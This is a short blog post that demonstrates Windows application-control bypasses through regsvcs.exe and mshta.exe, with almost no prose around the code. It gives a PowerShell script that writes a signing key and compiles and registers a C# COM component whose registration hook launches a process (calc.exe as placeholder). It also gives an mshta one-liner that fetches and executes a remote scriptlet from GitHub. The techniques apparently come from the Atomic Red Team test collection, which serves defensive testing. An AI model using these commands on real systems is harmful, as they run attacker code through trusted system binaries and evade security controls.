---
title: Mshta_RegSvcsRegAsmBypass
date: 2018-01-17 21:07:49
tags: Windows
categories: Windows
---
![enter description here][1]
<!--more-->
## regsvcs.exe

demon.ps1
``` demon.ps1
$key = 'BwIAAAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z64cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5clHIGaL7nZbp6qukLH0lLEq
/vW979GWzVAgSZaGVCFpuk6p1y69cSr3STlzljJrY76JIjeS4+RhbdWHp99y8QhwRllOC0qu/WxZaffHS2te/PKzIiTuFfcP46qxQoLR8s3QZhAJBnn9TGJkbi
x8MTgEt7hD1DC2hXv7dKaC531ZWqGXB54OnuvFbD5P2t+vyvZuHNmAy3pX0BDXqwEfoZZ+hiIk1YUDSNOE79zwnpVP1+BN0PK5QCPCS+6zujfRlQpJ+nfHLLi
cweJ9uT7OG3g/P+JpXGN0/+Hitolufo7Ucjh+WvZAU//dzrGny5stQtTmLxdhZbOsNDJpsqnzwEUfL5+o8OhujBHDm/ZQ0361mVsSVWrmgDPKHGGRx+7Fbd
gpBEq3m15/4zzg343V9NBwt1+qZU+TSVPU0wRvkWiZRerjmDdehJIboWsx4V8aiWx8FPPngEmNz89tBAQ8zbIrJFfmtYnj1fFmkNu3lglOefcacyYEHPX/t
qcBuBIg/cpcDHps/6SGCCciX3tufnEeDMAQjmLku8X4zHcgJx6FpVK7qeEuvyV0OGKvNor9b/WKQHIHjkzG+z6nWHMoMYV5VMTZ0jLM5aZQ6ypwmFZaNmtL
6KDzKv8L1YN2TkKjXEoWulXNliBpelsSJyuICplrCTPGGSxPGihT3rpZ9tbLZUefrFnLNiHfVjNi53Yg4='
$Content = [System.Convert]::FromBase64String($key)
Set-Content key.snk -Value $Content -Encoding Byte
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /target:library /out:regsvcs.dll /keyfile:key.snk RegSvcsRegAsmBypass.cs
C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe regsvcs.dll 
```




Github : https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Payloads/RegSvcsRegAsmBypass.cs





RegSvcsRegAsmBypass.cs
``` stylus
using System;
using System.EnterpriseServices;
using System.Runtime.InteropServices;
namespace regsvcser
{ 
    public class Bypass : ServicedComponent
    {
        public Bypass() { Console.WriteLine("I am a basic COM Object"); }		
		[ComRegisterFunction] //This executes if registration is successful
		public static void RegisterClass ( string key )
		{
			System.Diagnostics.Process.Start("calc.exe");
		}		
		[ComUnregisterFunction] //This executes if registration fails
		public static void UnRegisterClass ( string key )
		{
			System.Diagnostics.Process.Start("calc.exe");
		}
    }

}
```


![enter description here][2]






## mshta.exe
``` stylus
mshta.exe javascript:a=GetObject("script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/atomic-dev-cs/Windows/Payloads/mshta.sct").Exec();close();
```
![enter description here][3]


![enter description here][4]


  [1]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/7fd532a8d32ff025ea824eeaa3e3d9b7.jpg
  [2]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1516196533988.jpg
  [3]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/61EF8F4066E2C47D823299E7D9B7C121.jpg 
  [4]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/DB6212DEA5763595C96DB3BE85ABD29A.jpg 